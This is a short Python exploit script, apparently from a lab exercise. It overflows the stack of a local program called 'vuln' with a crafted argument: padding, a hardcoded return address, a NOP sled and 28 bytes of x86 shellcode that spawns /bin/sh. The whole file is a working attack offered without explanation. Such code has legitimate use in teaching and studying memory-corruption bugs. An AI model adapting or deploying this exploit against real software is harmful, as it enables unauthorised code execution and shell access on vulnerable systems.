#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

#Spawn a shell. Size- 28 bytes.
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"

ret_addr = 0xbffff218

#endianess conversion
def conv(num):
 return struct.pack("<I",num)

#Junk + Shellcode + Return Address + Junk
buf = "A" * 172
buf += conv(ret_addr)
buf += "\x90" * 30
buf += scode
buf += "A" * 22

print "Calling vulnerable program"
call(["./vuln", buf])

